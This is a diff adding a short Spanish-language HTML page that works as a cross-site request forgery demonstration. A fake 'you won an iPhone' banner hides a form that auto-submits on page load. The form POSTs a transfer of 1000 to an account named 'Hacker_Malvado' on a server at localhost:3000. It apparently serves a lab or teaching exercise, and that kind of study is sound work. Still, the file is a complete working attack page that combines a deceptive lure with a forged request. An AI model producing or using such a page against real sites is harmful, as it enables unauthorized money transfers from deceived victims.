@@ -1,0 +1,11 @@
+<html>
+    <body onload="setTimeout(() => document.forms[0].submit(), 5000);">
+        <h1>¡HAS GANADO UN IPHONE!</h1>
+        <p>Cargando tu premio...</p>
+        
+        <form action="http://localhost:3000/transferir" method="POST" style="display:none;">
+            <input type="hidden" name="monto" value="1000">
+            <input type="hidden" name="cuenta" value="Hacker_Malvado">
+        </form>
+    </body>
+</html>
